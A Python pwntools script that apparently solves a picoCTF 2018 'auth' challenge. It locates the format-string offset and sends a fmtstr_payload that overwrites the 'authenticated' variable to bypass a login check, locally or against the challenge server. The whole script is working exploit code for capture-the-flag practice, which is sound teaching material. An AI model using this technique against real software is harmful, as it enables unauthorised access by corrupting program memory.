#!/usr/bin/env python

from pwn import *
import argparse
import os

LOCAL_PATH = "./auth"
REMOTE_PATH = ["2018shell.picoctf.com", 43438]

def get_process(is_remote = False):
    if is_remote:
        return remote(*REMOTE_PATH)
    else:
        return process(LOCAL_PATH)

def exec_fmt(payload, is_remote = False):
    proc = get_process(is_remote)
    proc.sendlineafter("(yes/no)", payload)
    return proc.recvall()


parser = argparse.ArgumentParser()
parser.add_argument("-r", "--is_remote", help="Connect to remote server?", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
log.info("Address of 'authenticated': {}".format(hex(e.symbols['authenticated'])))

autofmt = FmtStr(exec_fmt)

writes = {e.symbols['authenticated']:   1}
payload = fmtstr_payload(autofmt.offset, writes)
log.info("Payload: {}".format(enhex(payload)))

print (exec_fmt(payload, args.is_remote))
